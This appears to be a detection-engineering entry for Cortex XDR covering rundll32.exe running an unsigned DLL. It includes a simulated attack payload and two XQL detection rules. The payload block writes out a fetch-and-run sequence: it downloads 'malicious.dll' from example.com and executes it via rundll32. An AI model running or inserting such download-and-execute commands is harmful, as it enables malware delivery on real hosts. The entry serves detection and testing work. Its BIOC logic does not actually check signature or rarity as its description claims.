identity.description: An attacker uses rundll32.exe to execute a malicious DLL that is unsigned and rare in the environment. Cortex detects this behavior as suspicious. The attack chain involves downloading the DLL, executing it via rundll32, and establishing C2 communication.

payload.code:
cd C:\Windows\Temp
wget https://example.com/malicious.dll -OutFile malicious.dll
rundll32.exe malicious.dll,EntryPoint

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: Rundll32 Executes Rare Unsigned Module
biocs.description: Detects rundll32.exe executing a rare or unsigned DLL module.
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'rundll32.exe'
| filter action_file_path contains '.dll'
| comp count() as events by actor_process_image_name, agent_hostname
| sort desc events

abiocs.name: Suspicious Rundll32 Execution with Unsigned DLL
abiocs.description: Behavioral ABIOC detecting rundll32.exe executing an unsigned DLL, which is a common technique used in malicious payload delivery.
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'rundll32.exe'
| filter action_file_path contains '.dll'
| filter action_file_signature_status = 'unsigned'
